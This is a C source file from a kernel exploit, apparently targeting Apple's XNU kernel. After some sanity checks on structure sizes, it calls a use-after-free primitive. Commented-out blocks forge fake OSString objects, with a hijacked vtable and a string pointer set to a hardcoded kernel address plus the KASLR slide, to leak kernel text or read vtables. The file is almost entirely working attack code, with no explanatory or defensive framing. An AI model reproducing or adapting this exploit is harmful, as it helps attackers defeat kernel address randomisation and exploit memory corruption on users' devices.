#include <stddef.h>             // size_t

#include "common.h"             // ASSERT
#include "io.h"                 // OSData, OSString, kOSStringNoCopy
#include "libexploit.h"         // get_kernel_slide, uaf_get_bytes

static void sanity()
{
#ifdef __LP64__
    ASSERT(sizeof(OSData) == 12 * sizeof(uint32_t));
    ASSERT(sizeof(OSString) == 8 * sizeof(uint32_t));
#else
    ASSERT(sizeof(OSData) == 7 * sizeof(uint32_t));
    ASSERT(sizeof(OSString) == 5 * sizeof(uint32_t));
#endif
    // TODO: sysctl("hw.cputype")
}

void exploit()
{
    sanity();

    uaf_get_vtab();

    /*size_t kslide = get_kernel_slide();
    OSString osstr =
    {
        .vtab = (void*)(0xffffff80044f0c38 + kslide),
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
        .length = 0xf00,                                // can't get more than 0x1000 at once
        .string = (void*)(0xffffff8004004000 + kslide), // kernel text base
    };
    uaf_get_bytes(&osstr);*/

    /*OSString osstr =
    {
        .vtab = (vtab_t)(0xffffff8004536370 + kslide) - 4,
        .retainCount = 100,
        .flags = kOSStringNoCopy,
        .length = 0x0,
        .string = NULL,
    };
    uaf_parse(&osstr);*/

    /*OSString osstr =
    {
        .vtable      = (void*)0x0,
        .retainCount =        0x0,
        .flags       =        0x0,
        .length      =        0x0,
        .string      = (void*)0x0,
    };
    uaf_parse(&osstr);*/
}
